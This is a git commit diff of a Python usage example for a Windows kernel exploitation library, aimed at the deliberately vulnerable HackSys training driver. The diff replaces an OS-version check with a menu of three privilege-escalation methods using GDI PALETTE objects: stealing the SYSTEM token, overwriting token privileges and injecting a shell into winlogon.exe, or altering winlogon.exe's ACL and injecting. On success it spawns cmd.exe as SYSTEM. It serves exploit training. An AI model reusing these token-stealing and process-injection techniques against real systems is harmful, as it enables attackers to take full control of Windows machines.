f3f2feb7b4908dfcd28453661a95b6881a6e0e7a
Csaba Fitzl <fitzl.csaba@gmail.com>
2017-11-24 17:54:54 +0100

    rename and add data only shell codes

--- usage_examples/hacksys_arbitrary_overwrite-universal-win7-10x64_palette.py
+++ usage_examples/hacksys_arbitrary_overwrite-universal-win7-10x64_palette.py
@@ -1,8 +1,7 @@
 from kex import *
 from ctypes import *
 from ctypes.wintypes import *
-import struct, sys, os, time, platform
-
+import struct, sys, os, time
 
 if __name__ == '__main__':
 	print "[*] HackSysExtremeVulnerableDriver Arbitrary Overwrite privilige escalation"
@@ -15,11 +14,16 @@ if __name__ == '__main__':
 		print "[-] Coudn't open driver, exiting..."
 		sys.exit(-1)
 
-	if platform.platform() == 'Windows-10-10.0.16299': #OS is Win10 v1709 (RS3)
-		(what, where, manager_palette_handle, worker_palette_handle) = get_www_address_and_palettes()
-	else:
-		(what, where, manager_bitmap_handle, worker_bitmap_handle) = get_www_address_and_bitmaps()
-
+	print "[!] Chose exploit method:"
+	print "\t[1] Do tokenstealing with PALETTEs"
+	print "\t[2] Overwrite token privileges with PALETTEs and inject into winlogon.exe"
+	print "\t[3] Change ACL of winlogon.exe with PALETTEs and inject into winlogon.exe"
+	choice = raw_input("[!] Type 1 or 2 or 3 and press enter: ")
+	if choice not in ['1','2','3']:
+		print "[-] 1 or 2 or 3, not something else, start over..."
+		sys.exit(-1)
+	
+	(what, where, manager_palette_handle, worker_palette_handle) = get_www_address_and_palettes()
 	input = struct.pack("<Q", addressof(what)) 
 	input += struct.pack("<Q", where) 
 
@@ -40,13 +44,16 @@ if __name__ == '__main__':
 								   None,
 								   0x0
 								   )
-	if platform.platform() == 'Windows-10-10.0.16299': #OS is Win10 v1709 (RS3)
+	if choice == '1':
 		tokenstealing_with_palettes(manager_palette_handle, worker_palette_handle)
-	else:
-		tokenstealing_with_bitmaps(manager_bitmap_handle, worker_bitmap_handle)
-
-	if shell32.IsUserAnAdmin():
-		print "[+] We got SYSTEM!!"
-		os.system('cmd.exe')
-	else:
-		print "[-] Something went wrong with the exploit, no SYSTEM"
+		if shell32.IsUserAnAdmin():
+			print "[+] We got SYSTEM!!"
+			os.system('cmd.exe')
+		else:
+			print "[-] Something went wrong with the exploit, no SYSTEM"
+	elif choice == '2':
+		privilege_with_palettes(manager_palette_handle, worker_palette_handle)
+		inject_shell(manager_palette_handle, worker_palette_handle)
+	elif choice == '3':
+		acl_with_palettes(manager_palette_handle, worker_palette_handle, "winlogon.exe")
+		inject_shell(manager_palette_handle, worker_palette_handle)
